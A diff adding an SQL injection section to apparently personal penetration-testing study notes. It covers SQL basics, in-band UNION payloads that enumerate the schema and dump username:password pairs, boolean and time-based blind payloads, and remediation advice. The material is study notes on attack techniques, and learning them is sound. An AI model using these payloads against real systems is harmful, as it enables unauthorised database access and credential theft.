@@ -141,6 +141,51 @@ Get cookie from xss:
 - use hexadecimal value to bypass the filter.
 - cheat sheet for more payloads: https://github.com/payloadbox/command-injection-payload-list
 
+## SQL Injection
+- Structured Query Language
+- ``` select * from users where username like 'a%'; ``` returns any rows with username beginning with the letter a.
+- ``` select * from users where username like '%n'; ```  ending with the letter n.
+- ``` select * from users where username like '%mi%'; ``` characters mi within them.
+
+Union
+- ``` SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers; ```
+
+Insert
+- ``` insert into users (username,password) values ('bob','password123'); ```
+
+Update
+- ``` update users SET username='root',password='pass123' where username='admin'; ```
+
+Delete
+- ``` delete from users where username='martin'; ```
+
+In-Band SQL Injection
+- select * from article where id = ``` 0 UNION SELECT 1,2,database() ```
+- get database name
+- select * from article where id = ``` 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' ```
+- get table names in the database "sqli_one"
+- select * from article where id = ``` 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' ```
+- get column names in the table "staff_users"
+- select * from article where id = ``` 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users ```
+
+Blind SQLi (Boolean Based)
+- select * from users where username = '```A' UNION SELECT 1,2,3 WHERE database() like 's%';--```' LIMIT 1 
+- we can try every possible combination to find the database`s name.
+
+Blind SQLi (Time base)
+The table has 2 columns.
+- ``` admin123' UNION SELECT SLEEP(5);-- ``` No sleep, just return.
+- ``` admin123' UNION SELECT SLEEP(5),2;-- ``` Sleep for 5 sconds.
+
+Out-of-Band SQLi:
+- attack channel could be a web request
+- data gathering channel could be monitoring HTTP/DNS requests made to a service you control.
+
+Remediation：
+- Prepared Statements (With Parameterized Queries)
+- Input Validation
+- Escaping User Input
+
 ## Burp Suite Basic
 **Extensions**
 - java, jython, jRuby
